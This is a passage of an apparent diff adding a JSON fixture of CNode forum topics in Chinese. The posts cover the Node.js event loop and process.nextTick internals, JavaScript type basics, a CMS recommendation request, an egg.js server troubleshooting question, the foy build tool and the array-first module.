handles</li>\n<li>有等待关闭的handles</li>\n</ul>\n<p>如果上述都不符合，则超时时间为距离现在最近的timer；如果没有timer则poll阶段会一直阻塞下去</p>\n<h2>check阶段</h2>\n<p>见上面的 <em>idle和prepare阶段</em></p>\n<h2>close阶段</h2>\n<pre class=\"prettyprint language-C\"><code>static void uv__run_closing_handles(uv_loop_t* loop) {\n  uv_handle_t* p;\n  uv_handle_t* q;\n\n  p = loop-&gt;closing_handles;\n  loop-&gt;closing_handles = NULL;\n\n  while (p) {\n    q = p-&gt;next_closing;\n    uv__finish_close(p);\n    p = q;\n  }\n}\n</code></pre><p>这段代码非常浅显，就是循环关闭所有的closing handles，无需多言。其中的callback调用在<code>uv__finish_close()</code>中</p>\n<h2>process.nextTick在哪里</h2>\n<p>文档中提到<code>process.nextTick()</code>不属于上面的任何一个phase，它在每个phase结束的时候都会运行。但是我们看到<code>uv_run()</code>中只是依次运行了6个phase的函数，并没有<code>process.nextTick()</code>影子，那它是怎么被驱动起来的呢？<br>\n这个问题要从两个c++和js的源码层面来说明。</p>\n<h3>process.nextTick在js层面的实现</h3>\n<p><code>process.nextTick</code>的实现在next_tick.js中</p>\n<pre class=\"prettyprint language-javascript\"><code>  function nextTick(callback) {\n    if (typeof callback !== &#x27;function&#x27;)\n      throw new errors.TypeError(&#x27;ERR_INVALID_CALLBACK&#x27;);\n\n    if (process._exiting)\n      return;\n\n    var args;\n    switch (arguments.length) {\n      case 1: break;\n      case 2: args = [arguments[1]]; break;\n      case 3: args = [arguments[1], arguments[2]]; break;\n      case 4: args = [arguments[1], arguments[2], arguments[3]]; break;\n      default:\n        args = new Array(arguments.length - 1);\n        for (var i = 1; i &lt; arguments.length; i++)\n          args[i - 1] = arguments[i];\n    }\n\n    push(new TickObject(callback, args, getDefaultTriggerAsyncId()));&#x2F;&#x2F;将callback封装为一个对象放入队列中\n  }\n</code></pre><p>它并没有什么魔法，也没有调用C++提供的函数，只是简单地将所有回调封装为对象并放入队列。而callback的执行是在函数<code>_tickCallback()</code></p>\n<pre class=\"prettyprint language-javascript\"><code>  function _tickCallback() {\n    let tock;\n    do {\n      while (tock = shift()) {\n        const asyncId = tock[async_id_symbol];\n        emitBefore(asyncId, tock[trigger_async_id_symbol]);\n        if (destroyHooksExist())\n          emitDestroy(asyncId);\n\n        const callback = tock.callback;\n        if (tock.args === undefined)\n          callback();&#x2F;&#x2F;执行调用process.nextTick()时放置进来的callback\n        else\n          Reflect.apply(callback, undefined, tock.args);&#x2F;&#x2F;执行调用process.nextTick()时放置进来的callback\n\n        emitAfter(asyncId);\n      }\n      runMicrotasks();&#x2F;&#x2F;microtasks将会在此时执行，例如Promise\n    } while (head.top !== head.bottom || emitPromiseRejectionWarnings());\n    tickInfo[kHasPromiseRejections] = 0;\n  }\n</code></pre><p>可以看到<code>_tickCallback()</code>会循环执行队列中所有callback，值得注意的是microtasks的执行时机， 因此<code>_tickCallback()</code>的执行就意味着<code>process.nextTick()</code>的回调的执行。我们继续搜索一下发现<code>_tickCallback()</code>在好几个地方都有被调用，但是我们只关注跟event loop相关的。<br>\n在next_tick.js中发现</p>\n<pre class=\"prettyprint language-javascript\"><code>  const [\n    tickInfo,\n    runMicrotasks\n  ] = process._setupNextTick(_tickCallback);\n</code></pre><p>查找了一下发现在node.cc中有</p>\n<pre class=\"prettyprint language-C++\"><code>env-&gt;SetMethod(process, &quot;_setupNextTick&quot;, SetupNextTick);&#x2F;&#x2F;暴露_setupNextTick给js\n</code></pre><p><code>_setupNextTick()</code>是node.cc那边暴露出来的方法，因此猜测这就是连接event loop的桥梁。</p>\n<h3>c++中执行process.nextTick的回调</h3>\n<p>在node.cc中找出<code>SetupNextTick()</code>函数，有这样的代码片段</p>\n<pre class=\"prettyprint language-C++\"><code>void SetupNextTick(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {\n  Environment* env = Environment::GetCurrent(args);\n\n  CHECK(args[0]-&gt;IsFunction());\n  &#x2F;&#x2F;把js中提供的回调函数（即_tickCallback）保存起来，以供调用\n  env-&gt;set_tick_callback_function(args[0].As&lt;Function&gt;());\n  ...\n}\n</code></pre><p><code>_tickCallback</code>被放置到env里面去了，那它何时被调用？也是在node.cc中我们发现</p>\n<pre class=\"prettyprint language-C++\"><code>void InternalCallbackScope::Close() {\n  if (!tick_info-&gt;has_scheduled()) {\n    env_-&gt;isolate()-&gt;RunMicrotasks();\n  }\n  &#x2F;&#x2F;...\n  &#x2F;&#x2F;终于调用在SetupNextTick()中放置进来的函数了\n  if (env_-&gt;tick_callback_function()-&gt;Call(process, 0, nullptr).IsEmpty()) {\n    env_-&gt;tick_info()-&gt;set_has_thrown(true);\n    failed_ = true;\n  }\n}\n</code></pre><p>可知<code>InternalCallbackScope::Close()</code>会调用它，而<code>InternalCallbackScope::Close()</code>则在文件node.cc的<code>InternalMakeCallback()</code>中被调用</p>\n<pre class=\"prettyprint language-C++\"><code>MaybeLocal&lt;Value&gt; InternalMakeCallback(Environment* env,\n                                       Local&lt;Object&gt; recv,\n                                       const Local&lt;Function&gt; callback,\n                                       int argc,\n                                       Local&lt;Value&gt; argv[],\n                                       async_context asyncContext) {\n  CHECK(!recv.IsEmpty());\n  InternalCallbackScope scope(env, recv, asyncContext);\n  &#x2F;&#x2F;...\n  scope.Close();&#x2F;&#x2F;Close会调用_tickCall\n  &#x2F;&#x2F;...\n}\n</code></pre><p>而<code>InternalMakeCallback()</code>则是在async_wrap.cc的<code>AsyncWrap::MakeCallback()</code>中被调用</p>\n<pre class=\"prettyprint language-C++\"><code>MaybeLocal&lt;Value&gt; AsyncWrap::MakeCallback(const Local&lt;Function&gt; cb,\n                                          int argc,\n                                          Local&lt;Value&gt;* argv) {\n  &#x2F;&#x2F;cb就是在event loop的6个phase中执行的回调函数\n  MaybeLocal&lt;Value&gt; ret = InternalMakeCallback(env(), object(), cb, argc, argv, context);\n}\n</code></pre><p>AsyncWrap类是异步操作的封装，它是一个顶级的类，TimerWrap、TcpWrap等封装异步的类都继承了它，这意味着这些类封装异步操作的时候都会调用<code>MakeCallback()</code>。至此真相大白了，<code>uv_run()</code>中的回调都是经过<code>AsyncWrap::MakeCallback()</code>包装过的，因此回调执行完毕之后都会执行<code>process.nextTick()</code>的回调了，与文档的描述是相符合的。整理一下<code>_tickCallback()</code>的转移并最终被调用的流程</p>\n<p>在js层面</p>\n<pre class=\"prettyprint language-JAVASCRIPT\"><code>_tickCallback()&#x2F;&#x2F;js中执行process.nextTick()的回调函数\n\t\t↓\nprocess._setupNextTick(_tickCallback)\t\t&#x2F;&#x2F;c++和js的桥梁，将回调交给C++执行\n\n</code></pre><p>此时<code>_tickCallback()</code>被转移到在C++层面，它首先被存储到env中</p>\n<pre class=\"prettyprint language-C++\"><code>env-&gt;set_tick_callback_function()&#x2F;&#x2F;将_tickCallback存储到env中\n        ↓\t\t\nenv-&gt;SetMethod(process, &quot;_setupNextTick&quot;, SetupNextTick);&#x2F;&#x2F;调用上者，js中process._setupNextTick的真身\n</code></pre><p>被存储到env的<code>_tickCallback()</code>被调用流程如下：</p>\n<pre class=\"prettyprint language-C++\"><code>env_-&gt;tick_callback_function()&#x2F;&#x2F;取出_tickCallback执行\n        ↓\nInternalCallbackScope::Close()&#x2F;&#x2F;调用前者\n        ↓  \nInternalMakeCallback()&#x2F;&#x2F;调用前者   \n        ↓  \nAsyncWrap::MakeCallback()&#x2F;&#x2F;调用前者   \n        ↓  \n被多个封装异步操作的类继承并调用\n        ↓\n被uv_run()执行，从而实现在每个phase之后调用process.nextTick提供的回调\t\n</code></pre><p>整个过程分析得比较粗糙，后面其实很多细节没去寻找，不过大家可以从以下的参考资料补全其它细节。例如timer的整个执行流程可以看<br>\n<a href=\"https://github.com/xtx1130/blog/issues/15\">《从./lib/timers.js来看timers相关API底层实现》</a>，是对我没提及地方的一个良好补充。</p>\n<h1>参考资料</h1>\n<p>由于node发展非常迅猛，很多早期的源码分析已经过时（源码的目录结构或者实现代码已经改变），不过还是很有指导意义。</p>\n<ul>\n<li><a href=\"http://acemood.github.io/2016/02/01/event-loop-in-javascript/\">Event loop in JavaScrip</a>：启迪我找到答案的最为关键的文章</li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-v8engine/\">使用 Google V8 引擎开发可定制的应用程序</a>：这篇文章介绍了v8引擎暴露C++对象给js的方法，对读懂node源码非常有帮助</li>\n<li><a href=\"https://github.com/yjhjstz/deep-into-node\">深入理解Node.js：核心思想与源码分析</a>：对node源码的一个全面分析，基于node 6.0</li>\n<li><a href=\"https://github.com/xtx1130/blog\">node 源码粗读系列</a>：基于9.0的源码分析，非常详细且跟上了最新变化</li>\n<li><a href=\"https://cnodejs.org/topic/55a76cf95d5240f223494f31\">Node.js挖掘系列</a></li>\n<li><a href=\"https://cnodejs.org/topic/56e3dfde545c5c736d12383f\">node源码详解系列</a></li>\n</ul>\n</div>",
+          "title" : "不要混淆nodejs和浏览器中的event loop",
+          "last_reply_at" : "2018-12-05T15:13:24.630Z",
+          "good" : true,
+          "top" : false,
+          "reply_count" : 47,
+          "visit_count" : 17785,
+          "create_at" : "2018-02-24T06:40:23.236Z",
+          "author" : {
+              "loginname" : "youth7",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/8315732?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5a62b395afa0a121784a8de0",
+          "author_id" : "590d7e623504ce1c2ac45912",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>JavaScript 中基础数据类型</h2>\n<table>\n<thead>\n<tr>\n<th>数据类型名称</th>\n<th>数据类型说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Undefined</td>\n<td>只有一个值，即 <code>undefined</code>，声明变量的初始值。</td>\n</tr>\n<tr>\n<td>Null</td>\n<td>只有一个值，即 <code>null</code>，表示空指针，<code>undefined</code> 的值是派生 <code>null</code> 的值。</td>\n</tr>\n<tr>\n<td>String</td>\n<td>由零或多个 16 位 <code>Unicode</code> 字符组成</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>只有两个值，即 <code>true</code> 和 <code>false</code></td>\n</tr>\n<tr>\n<td>Number</td>\n<td>该类型使用 <code>IEEE754</code> 来表示整数和浮点数。</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>ECMAScript 中的对象其实就是一组数据和功能的集合。</td>\n</tr>\n<tr>\n<td>Symbol</td>\n<td>ES6 中新加入的数据类型，表示独一无二的值。</td>\n</tr>\n</tbody>\n</table>\n<p><strong>其中 <code>Object</code> 类型包含 <code>Function</code>、<code>Array</code>、<code>Date</code>、<code>RegExp</code>。</strong></p>\n<h2>JavaScript 中的内置对象</h2>\n<table>\n<thead>\n<tr>\n<th>对象名称</th>\n<th>对象说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Arguments</td>\n<td>函数参数集合</td>\n</tr>\n<tr>\n<td>Array</td>\n<td>数组</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>布尔对象</td>\n</tr>\n<tr>\n<td>Date</td>\n<td>日期对象</td>\n</tr>\n<tr>\n<td>Error</td>\n<td>异常对象</td>\n</tr>\n<tr>\n<td>Function</td>\n<td>函数构造器</td>\n</tr>\n<tr>\n<td>Math</td>\n<td>数学对象</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>数值对象</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>基础对象</td>\n</tr>\n<tr>\n<td>String</td>\n<td>字符串对象</td>\n</tr>\n</tbody>\n</table>\n<h2><code>typeof null</code> 返回结果为 <code>'object'</code></h2>\n<p>  从逻辑上来看，<code>null</code> 值表示一个空对象指针，因此会返回一个 <code>'object'</code>，也可以理解为是 JavaScript 早期的一个BUG，而现在标准就是这样规范的。V8曾经修正并实现过<code>typeof null === 'null'</code>,但最终证明不可行。<a href=\"http://wiki.ecmascript.org/doku.php?id=harmony:typeof_null\">http://wiki.ecmascript.org/doku.php?id=harmony:typeof_null</a></p>\n<h2><code>Array</code> 对象方法与作用</h2>\n<table>\n<thead>\n<tr>\n<th>方法名称</th>\n<th>对象说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>concat</td>\n<td>用于连接两个或更多的数组并返回结果,<code>arr1.concat(arr2)</code></td>\n</tr>\n<tr>\n<td>join</td>\n<td>把数组的所有元素放入一个字符串，元素通过制定的分隔符进行分离 <code>arr1.join(',')</code></td>\n</tr>\n<tr>\n<td>pop</td>\n<td>删除并返回数组中的最后一个元素 <code>arr1.pop()</code></td>\n</tr>\n<tr>\n<td>push</td>\n<td>向数组的末尾添加一个或更多元素，并返回新的长度 <code>arr1.push(1)</code></td>\n</tr>\n<tr>\n<td>reverse</td>\n<td>颠倒数组中的元素顺序,<code>arr1.reverse()</code></td>\n</tr>\n<tr>\n<td>shift</td>\n<td>删除并返回数组中的第一个元素  <code>arr1.shift()</code></td>\n</tr>\n<tr>\n<td>slice</td>\n<td>从某个已有的数组返回指定的元素</td>\n</tr>\n<tr>\n<td>sort</td>\n<td>对数组的元素进行排序 <code>arr1.sort()</code></td>\n</tr>\n<tr>\n<td>splice</td>\n<td>删除元素，并向数组中添加新元素</td>\n</tr>\n<tr>\n<td>toString</td>\n<td>把数组转成字符串 <code>arr1.toString()</code></td>\n</tr>\n<tr>\n<td>toLocaleString</td>\n<td>把数组转换为本地字符串 <code>arr1.toLocaleString()</code></td>\n</tr>\n<tr>\n<td>valueOf</td>\n<td>返回数组对象的原始值</td>\n</tr>\n</tbody>\n</table>\n<h2><code>typeof</code> 可能的返回值</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>返回结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Undefined</td>\n<td>“undefined”</td>\n</tr>\n<tr>\n<td>Null</td>\n<td>“object”</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>“boolean”</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>“number”</td>\n</tr>\n<tr>\n<td>String</td>\n<td>“string”</td>\n</tr>\n<tr>\n<td>Symbol （ECMAScript 6 新增）</td>\n<td>“symbol”</td>\n</tr>\n<tr>\n<td>宿主对象（由JS环境提供）</td>\n<td>Implementation-dependent</td>\n</tr>\n<tr>\n<td>函数对象（[[Call]] 在ECMA-262条款中实现了）</td>\n<td>“function”</td>\n</tr>\n<tr>\n<td>任何其他对象</td>\n<td>“object”</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>上述来自 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof\">MDN</a></p>\n</blockquote>\n<p>对文章有不正确之处，请给予纠正。<a href=\"https://github.com/SilenceHVK/articles/issues/16\">github 文章</a> 请顺手给个 Star，最后感谢您的阅读。</p>\n</div>",
+          "title" : "【JavaScript 基础知识】一篇关于 JavaScript 一些知识点的总结 —— 持续更新",
+          "last_reply_at" : "2018-12-05T14:02:07.833Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 24,
+          "visit_count" : 3667,
+          "create_at" : "2018-01-20T03:12:21.593Z",
+          "author" : {
+              "loginname" : "SilenceHVK",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/12862565?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c06be08d3b8ab334e8dac2c",
+          "author_id" : "57073ca50928c91f1e7784c2",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>需求如下：\n1、不折腾，keystone、express、koa 这种虽说开发成本不高，但是产品化之后安全、运维都相当麻烦；\n2、基于 Node，不选 wordpress 这种是因为 php 只停留在 Hello World 上，出问题太麻烦；\n3、支持登录、注册、找回密码、邮件支持、数据库支持，不要静态生成类的；\n4、SEO 友好，不是 MVVM 结构的或者支持 SSR 类的；</p>\n<p>求各位大佬推荐。</p>\n</div>",
+          "title" : "求推荐一款基于 Node 不折腾的 CMS",
+          "last_reply_at" : "2018-12-05T13:20:01.489Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 7,
+          "visit_count" : 383,
+          "create_at" : "2018-12-04T17:48:56.787Z",
+          "author" : {
+              "loginname" : "Lucassssss",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/5128154?v=3&s=120"
+          }
+      },
+      {
+          "id" : "5c0622ad1c62d83349350837",
+          "author_id" : "51d37c80d44cbfa304285441",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>我在一台测试的阿里云服务器上（1核cpu, 2 G内存,  CentOS 7.4 64位）使用<code>egg-scripts start</code> 运行了 13个 egg.js 的项目。\n然后就开始持续的某些项目会自动关闭。</p>\n<pre class=\"prettyprint\"><code>$netstat -tunlp\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    \ntcp        0      0 127.0.0.1:40954         0.0.0.0:*               LISTEN      14117&#x2F;node          \ntcp        0      0 127.0.0.1:38938         0.0.0.0:*               LISTEN      14133&#x2F;node          \ntcp        0      0 127.0.0.1:7002          0.0.0.0:*               LISTEN      1686&#x2F;node           \ntcp        0      0 127.0.0.1:7101          0.0.0.0:*               LISTEN      21578&#x2F;node          \ntcp        0      0 127.0.0.1:3101          0.0.0.0:*               LISTEN      4616&#x2F;node           \ntcp        0      0 127.0.0.1:3102          0.0.0.0:*               LISTEN      24280&#x2F;node          \ntcp        0      0 127.0.0.1:7102          0.0.0.0:*               LISTEN      30380&#x2F;node          \ntcp        0      0 127.0.0.1:32000         0.0.0.0:*               LISTEN      16685&#x2F;java          \ntcp        0      0 127.0.0.1:43392         0.0.0.0:*               LISTEN      15767&#x2F;node          \ntcp        0      0 127.0.0.1:7008          0.0.0.0:*               LISTEN      5790&#x2F;node           \ntcp        0      0 127.0.0.1:33761         0.0.0.0:*               LISTEN      20628&#x2F;node          \ntcp        0      0 127.0.0.1:7009          0.0.0.0:*               LISTEN      8403&#x2F;node           \ntcp        0      0 127.0.0.1:35042         0.0.0.0:*               LISTEN      8595&#x2F;node           \ntcp        0      0 127.0.0.1:7011          0.0.0.0:*               LISTEN      6817&#x2F;node           \ntcp        0      0 127.0.0.1:43237         0.0.0.0:*               LISTEN      14823&#x2F;node          \ntcp        0      0 127.0.0.1:37381         0.0.0.0:*               LISTEN      13771&#x2F;node          \ntcp        0      0 127.0.0.1:7013          0.0.0.0:*               LISTEN      8537&#x2F;node           \ntcp        0      0 127.0.0.1:45445         0.0.0.0:*               LISTEN      24286&#x2F;node          \ntcp        0      0 127.0.0.1:44006         0.0.0.0:*               LISTEN      10339&#x2F;node          \ntcp        0      0 127.0.0.1:44294         0.0.0.0:*               LISTEN      13705&#x2F;node          \ntcp        0      0 127.0.0.1:7015          0.0.0.0:*               LISTEN      5008&#x2F;node           \ntcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      1578&#x2F;redis-server 1 \ntcp        0      0 127.0.0.1:39084         0.0.0.0:*               LISTEN      32417&#x2F;node          \ntcp        0      0 127.0.0.1:32846         0.0.0.0:*               LISTEN      27467&#x2F;node          \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3152&#x2F;nginx: master  \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1571&#x2F;sshd           \ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      14126&#x2F;node          \ntcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      18806&#x2F;node          \nudp        0      0 172.18.163.223:123      0.0.0.0:*                           456&#x2F;ntpd            \nudp        0      0 127.0.0.1:123           0.0.0.0:*                           456&#x2F;ntpd            \nudp        0      0 0.0.0.0:123             0.0.0.0:*                           456&#x2F;ntpd            \nudp6       0      0 :::123                  :::*                                456&#x2F;ntpd \n</code></pre><p>查看</p>\n<pre class=\"prettyprint\"><code>$free\n              total        used        free      shared  buff&#x2F;cache   available\nMem:        1882736     1639432      110384         584      132920       91400\nSwap:             0           0           0\n</code></pre><p>查看</p>\n<pre class=\"prettyprint\"><code>$top\n PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                                                    \n16685 root      20   0 2057540  58664   1748 S  1.3  3.1   1:10.59 java                                                                                                                                       \n 1225 root      20   0  129760   3152    944 S  0.3  0.2  42:45.29 AliYunDun                                                                                                                                  \n 8420 root      20   0 1106180  44192   2088 S  0.3  2.3   0:04.17 node                                                                                                                                       \n 8595 root      20   0 1222192  41316   4748 S  0.3  2.2   0:19.50 node                                                                                                                                       \n17687 root      20   0 1229388  55084   4516 S  0.3  2.9   0:03.79 node                                                                                                                                       \n    1 root      20   0   43388   2312   1128 S  0.0  0.1   0:13.30 systemd                                                                                                                                    \n    2 root      20   0       0      0      0 S  0.0  0.0   0:00.85 kthreadd                                                                                                                                   \n    3 root      20   0       0      0      0 S  0.0  0.0   0:16.02 ksoftirqd&#x2F;0                                                                                                                                \n    5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker&#x2F;0:0H \n</code></pre><p>看资源也不是占得比较多，各位大大请问问题是在哪里？</p>\n</div>",
+          "title" : "egg-scripts start 的egg 项目有上限吗？突然某些项目会自动关闭？为什么？",
+          "last_reply_at" : "2018-12-05T12:46:26.817Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 7,
+          "visit_count" : 261,
+          "create_at" : "2018-12-04T06:46:05.350Z",
+          "author" : {
+              "loginname" : "thomas0836",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/3435615?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c07c29b15a4d545e3f4b907",
+          "author_id" : "576544fd02d0ee4b6d8a3e54",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>npm 的 scripts 下写的命令太多就很容易很乱，各种第三方轮子都只能解决一部分问题，总感觉不是很好用，想找个类似 make 的工具只能找到 jake, 可是 jake 的 API 太老，居然很多都不支持 promise, 代码也不多，就干脆自己造轮子了, 感觉效果还行。</p>\n<p>项目地址: <a href=\"https://github.com/zaaack/foy\">https://github.com/zaaack/foy</a></p>\n<h3>特点:</h3>\n<ul>\n<li>基于 promise 的任务和内置工具函数(fs/shell), 无缝支持 async/await</li>\n<li>类似于 shelljs 的跨平台 shell dsl, 人人都会写 shell</li>\n<li>易学易用，无需为写仅仅几个 build 命令而花费几个小时去寻找和学习第三方包</li>\n<li>很小的安装成本\n<ul>\n<li>foy: <a href=\"https://packagephobia.now.sh/result?p=foy\"><img src=\"https://camo.githubusercontent.com/e322203961962839780cbe44499a669b08e3deb3/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d666f79\" alt=\"install size\"></a></li>\n<li>gulp: <a href=\"https://packagephobia.now.sh/result?p=gulp\"><img src=\"https://camo.githubusercontent.com/509352b6dd1e40a07c61a4ec5cc99aaee0f8afaf/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d67756c70\" alt=\"install size\"></a></li>\n<li>grunt: <a href=\"https://packagephobia.now.sh/result?p=grunt\"><img src=\"https://camo.githubusercontent.com/087d857351551b8a505e1224c9f3c78ccc0d98e2/68747470733a2f2f7061636b61676570686f6269612e6e6f772e73682f62616467653f703d6772756e74\" alt=\"install size\"></a></li>\n</ul>\n</li>\n<li>无缝和第三方支持 promise 的工具包整合，不需要封装成插件就能用</li>\n</ul>\n<p><img src=\"https://github.com/zaaack/foy/raw/master/docs/capture.gif?raw=true\" alt></p>\n<h3>使用:</h3>\n<p>安装</p>\n<pre class=\"prettyprint\"><code>yarn add -D foy # or npm i -D foy\n\n# Or Install globally with\n\nyarn add -g foy # or npm i -g foy\n\n</code></pre><p>在项目根目录下增加一个 Foyfile.js (或者 Foyfile.ts, 需要安装 <a href=\"https://github.com/TypeStrong/ts-node\">ts-node</a>)</p>\n<pre class=\"prettyprint\"><code>import { task, desc, option, strict, fs } from &#x27;foy&#x27;\n\n\ntask(&#x27;build&#x27;, async ctx =&gt; {\n  await ctx.exec(&#x27;tsc&#x27;)\n})\n\ndesc(&#x27;Build ts files with tsc&#x27;)\noption(&#x27;-w, --watch&#x27;, &#x27;watch file changes&#x27;)\nstrict() &#x2F;&#x2F; This will throw an error if you passed some options that doesn&#x27;t defined via &#96;option()&#96;\ntask(&#x27;build2&#x27;, async ctx =&gt; {\n  await ctx.exec(&#96;tsc ${ctx.options.watch ? &#x27;-w&#x27; : &#x27;&#x27;}&#96;)\n})\n\ntask(&#x27;task&#x27;, async ctx =&gt; {\n  await fs.rmrf(&#x27;&#x2F;some&#x2F;dir&#x2F;or&#x2F;file&#x27;) &#x2F;&#x2F; Remove directory or file\n  await fs.copy(&#x27;&#x2F;src&#x27;, &#x27;&#x2F;dist&#x27;) &#x2F;&#x2F; Copy folder or file\n  let json = await fs.readJson(&#x27;.&#x2F;xx.json&#x27;)\n  await ctx.env(&#x27;NODE_ENV&#x27;, &#x27;production&#x27;)\n  await ctx.cd(&#x27;.&#x2F;src&#x27;)\n  await ctx.exec(&#x27;some command&#x27;) &#x2F;&#x2F; Execute an command\n  let { stdout } = await ctx.exec(&#x27;ls&#x27;, { stdio: &#x27;pipe&#x27; }) &#x2F;&#x2F; Get the stdout, default is empty because it&#x27;s redirected to current process via &#96;stdio: &#x27;inherit&#x27;&#96;.\n})\n\n</code></pre><p>然后就可以运行任务了</p>\n<pre class=\"prettyprint\"><code># 安装在本地 node_modules 目录下\nnpx foy build\nnpx foy build1\nnpx foy task \n\n# 安装在全局\n\nfoy build\nfoy build1\n\n</code></pre></div>",
+          "title" : "foy: 基于 nodejs 的轻量级通用 build 工具",
+          "last_reply_at" : "2018-12-05T12:20:43.513Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 132,
+          "create_at" : "2018-12-05T12:20:43.512Z",
+          "author" : {
+              "loginname" : "zaaack",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/5233940?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c07310f1c62d83349350dc0",
+          "author_id" : "57067a058265278d59c7e61f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-first\">https://github.com/jonschlinkert/array-first</a></p>\n<h2>2、作用</h2>\n<p>获取数组第一个或者前几个元素</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const first = require(&#x27;array-first&#x27;);\n\nconsole.log(first([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;])) &#x2F;&#x2F; 输出：a\n\nconsole.log(first([&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;], 1)) &#x2F;&#x2F; 输出：d\n\nconsole.log(first([&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;], 2)) &#x2F;&#x2F; 输出：[&#x27;d&#x27;, &#x27;e&#x27;]\n\nconsole.log(first([], 2)) &#x2F;&#x2F; 输出：null\n\nconsole.log(first(&#x27;&#x27;, 2)) &#x2F;&#x2F; 输出：暴露异常Error: array-first expects an array as the first argument.\n\nconsole.log(first([1, 2, 3], &#x27;3&#x27;)) &#x2F;&#x2F; 输出：[1, 2, 3]\n\nconsole.log(first([1, 2, 3], &#x27;&#x27;)) &#x2F;&#x2F; 输出：[1]\n\nconsole.log(first([1, 2, 3], null)) &#x2F;&#x2F; 输出：1\n\nconsole.log(first([1, 2, 3], undefined)) &#x2F;&#x2F; 输出：1\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>var isNumber = require(&#x27;is-number&#x27;);\nvar slice = require(&#x27;array-slice&#x27;);\n\nmodule.exports = function arrayFirst(arr, num) {\n  if (!Array.isArray(arr)) {\n    throw new Error(&#x27;array-first expects an array as the first argument.&#x27;);\n  }\n\n  if (arr.length === 0) {\n    return null;\n  }\n\n  var first = slice(arr, 0, isNumber(num) ? +num : 1);\n  if (+num === 1 || num == null) {\n    return first[0];\n  }\n  return first;\n};\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）暴露出去的函数有两个参数，分别是数组和获取元素的个数；</p>\n<p>2）如果传入的不是数组，那么就会暴露类型错误的异常；</p>\n<p>3）如果传入的是空数组，那么就会返回null；</p>\n<p>4）接着通过slice函数截取第一个元素。如果未传入num或者num不是数字类型，那么默认截取1个元素；如果\bnum是大于1的数字类型，那么就截取长度为num的数组。</p>\n<p>5）如果num是1或者null类型，那么就截取数组第一个元素，返回的是一个元素。否则返回num长度的数组。</p>\n</div>",
+          "title" : "npm模块学习之array-first",
+          "last_reply_at" : "2018-12-05T10:11:37.285Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 7,
+          "visit_count" : 203,
+          "create_at" : "2018-12-05T01:59:43.294Z",
+          "author" : {
+              "loginname" : "sunfeng90",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c034ecb39c0af64fddb7c41",
+          "author_id" : "5bc2eae715e4fd1923f48ebb",
+          "tab" : "share",
